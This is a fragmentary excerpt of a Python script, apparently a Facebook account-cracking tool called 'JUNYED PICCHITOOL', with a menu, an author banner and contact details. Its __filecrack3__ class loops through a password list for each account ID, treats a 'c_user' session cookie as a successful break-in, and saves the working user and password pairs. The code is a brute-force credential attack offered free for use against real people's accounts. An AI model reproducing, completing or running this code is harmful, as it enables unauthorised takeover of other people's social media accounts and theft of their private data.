...
from concurrent.futures import ThreadPoolExecutor as JUNYED 
from concurrent.futures import ThreadPoolExecutor as JUNYED 
from datetime import datetime
from bs4 import BeautifulSoup
...
def main():
    ...
    if psy in ('6', '06'):
    	os.system("xdg-open https://www.facebook.com/100049034858425")
    if psy in ('7', '07'):
        time.sleep(2)
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING JUNYED PICCHITOOL')  
    else:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mJUNYED -OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mJUNYED \033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
banner = """
  ...
  \033[0;91m ██      ██  ██████  ██████ ██   ██ ██ 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m JUNYED  PICCHI│\033[1;37m• \033[1;36mTHIS TOOL IS FREE \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Junyed AhmedI│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01789052115 │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m JUNYED  PICCHI│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
